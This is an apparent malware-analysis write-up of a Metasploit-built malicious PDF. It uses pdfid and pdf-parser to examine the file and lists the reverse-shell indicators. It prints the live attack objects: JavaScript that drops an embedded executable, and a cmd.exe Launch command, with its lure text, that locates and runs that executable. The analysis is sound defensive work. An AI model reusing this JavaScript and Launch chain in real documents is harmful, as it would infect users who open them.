---
title: "Metasploit: adobe-pdf-embedded-file"
date: 2025-11-21
draft: false
summary: "A malicious PDF exploits JavaScript and Launch actions to extract and execute an embedded PE payload, establishing a reverse shell connection to an attacker-controlled server."
tags:
  - Malware Analysis
  - Windows
  - PDF
  - JavaScript
  - pdfid
  - pdf-parser
platform: Malware Analysis
---

### <span style="color:lightblue">TL;DR</span>
A malicious PDF uses two chained actions: an `OpenAction` triggers JavaScript that exports an embedded `template.pdf` object to disk, while a `Launch` action executes `cmd.exe` to run it. The exported file is not a PDF but a PE32 executable that establishes a reverse shell to `192.168.248.129:4444`.

### <span style="color:red">Initial Analysis</span>
```console
$ file *
evil.pdf: PDF document, version 1.0, 1 page(s)
```

`pdfid` revealed several suspicious indicators:
```console
$ pdfid evil.pdf
PDFiD 0.2.10 evil.pdf
 /JS                    1
 /JavaScript            1
 /AA                    1
 /OpenAction            1
 /Launch                1
```

The presence of `/JavaScript`, `/OpenAction`, and `/Launch` together is a strong indicator of a malicious document — the PDF will automatically execute code upon opening.

`pdf-parser` was used to examine each object in detail. The key objects are:

**obj 9** — `OpenAction` that fires JavaScript on open:
```
/S /JavaScript
/JS (this.exportDataObject({ cName: "template", nLaunch: 0 });)
```
This silently exports the embedded `template.pdf` object to disk without launching it.

**obj 10** — `Launch` action that executes `cmd.exe`:
```
/S /Launch
/Type /Action
/Win
    <<
    /F (cmd.exe)
    /D '(c:\\\\windows\\\\system32)'
    /P '(/Q /C %HOMEDRIVE%&cd %HOMEPATH%&(if exist "Desktop\\\\template.pdf" (cd "Desktop"))&(if exist "My Documents\\\\template.pdf" (cd "My Documents"))&(if exist "Documents\\\\template.pdf" (cd "Documents"))&(if exist "Escritorio\\\\template.pdf" (cd "Escritorio"))&(if exist "Mis Documentos\\\\template.pdf" (cd "Mis Documentos"))&(start template.pdf)\n\n\n\n\n\n\n\n\n\nTo view the encrypted content please check the "Do not show this message again" box and press Open.)'
    >>

```
The social engineering message at the end is shown in a dialog box to trick the user into clicking "Open", which triggers the `Launch` action and executes `template.pdf` (the dropped PE).

**obj 8** — the embedded payload stream. Extracted with:
```console
$ pdf-parser --object 8 --filter --raw evil.pdf > template.bin
```

The raw stream starts with `MZ` — a PE32 magic bytes header:
```console
b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00...
```

A Python script was used to parse and write the binary:
```python
import ast

with open('template.bin', 'r') as f:
    content = f.read()

start = content.find("b'") + 2
end = content.rfind("'")
data = ast.literal_eval("b'" + content[start:end] + "'")

with open('template.exe', 'wb') as f:
    f.write(data)
```
```console
$ file template.exe
template.exe: PE32 executable for MS Windows 4.00 (GUI), Intel i386, 5 sections
```

### <span style="color:red">Sandbox</span>
The extracted PE was executed in a sandbox. It established a connection to `192.168.248.129` over port `4444` — a default Metasploit reverse shell port.

![Sandbox network connections](image.png)


### <span style="color:lightblue">IOCs</span>

**Files**  
\- `evil.pdf` — malicious PDF document  
\- `template.exe` — embedded PE32 reverse shell payload  

**Network**  
\- C2 Server: `192.168.248.129`  
\- C2 Port: `4444/tcp`